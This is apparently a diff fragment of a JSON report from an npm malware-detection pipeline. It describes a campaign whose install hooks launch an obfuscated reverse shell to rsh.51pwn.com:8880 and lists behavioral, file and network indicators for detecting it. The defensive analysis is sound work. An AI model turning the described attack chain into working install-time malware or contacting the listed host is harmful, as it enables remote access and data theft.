+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/mineflayer-schem/1.3.6/package/example/builder.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/mineflayer-schem/1.3.6/package/lib/build.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
